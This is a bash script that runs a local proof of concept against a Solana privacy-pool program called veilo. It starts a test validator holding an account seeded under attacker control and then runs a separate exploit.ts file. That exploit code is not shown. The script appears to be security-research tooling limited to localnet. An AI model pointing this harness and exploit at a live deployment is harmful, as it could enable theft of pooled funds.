#!/usr/bin/env bash
# run.sh — one-command tier-2 PoC runner.
#
# Boots a local solana validator with the real, unmodified privacy_pool program
# and a genesis-seeded attacker-controlled jperp_slot, then runs the exploit.
# Localnet only. Never touches mainnet.
set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
export PATH="$HOME/.local/share/solana/install/active_release/bin:$HOME/.cargo/bin:$PATH"

SO="$HERE/veilo/target/deploy/privacy_pool.so"
PROG_KP="$HERE/veilo/target/deploy/privacy_pool-keypair.json"
PROGRAM_ID="$(solana address -k "$PROG_KP")"
LEDGER="$(mktemp -d /tmp/veilo-poc-ledger.XXXXXX)"
LOG="$HERE/validator.log"
RPC_PORT="${RPC_PORT:-18899}"
FAUCET_PORT="${FAUCET_PORT:-18901}"
RPC_URL="http://127.0.0.1:${RPC_PORT}"

[ -f "$SO" ] || { echo "missing $SO — run 'anchor build' in veilo/ first"; exit 1; }

echo "==> seeding attacker-controlled jperp_slot at genesis"
npx tsx "$HERE/seed-slot.ts"
SLOT_ADDR="$(cat "$HERE/slot-address.txt")"

echo "==> killing any stale validator"
pkill -f solana-test-validator || true
sleep 2

echo "==> launching solana-test-validator (program $PROGRAM_ID, ledger $LEDGER)"
solana-test-validator \
  --reset \
  --ledger "$LEDGER" \
  --bpf-program "$PROGRAM_ID" "$SO" \
  --account "$SLOT_ADDR" "$HERE/slot-account.json" \
  --rpc-port "$RPC_PORT" \
  --faucet-port "$FAUCET_PORT" \
  --dynamic-port-range 19100-19130 \
  --gossip-port 19100 \
  > "$LOG" 2>&1 &
VALIDATOR_PID=$!
trap 'kill $VALIDATOR_PID 2>/dev/null || true; rm -rf "$LEDGER"' EXIT

echo "==> waiting for RPC on $RPC_URL"
for i in $(seq 1 60); do
  if solana --url "$RPC_URL" cluster-version >/dev/null 2>&1; then break; fi
  sleep 1
done
solana --url "$RPC_URL" cluster-version >/dev/null 2>&1 || { echo "validator failed to start; see $LOG"; tail -30 "$LOG"; exit 1; }

echo "==> running exploit"
ANCHOR_PROVIDER_URL="$RPC_URL" npx tsx "$HERE/exploit.ts"
RC=$?
exit $RC
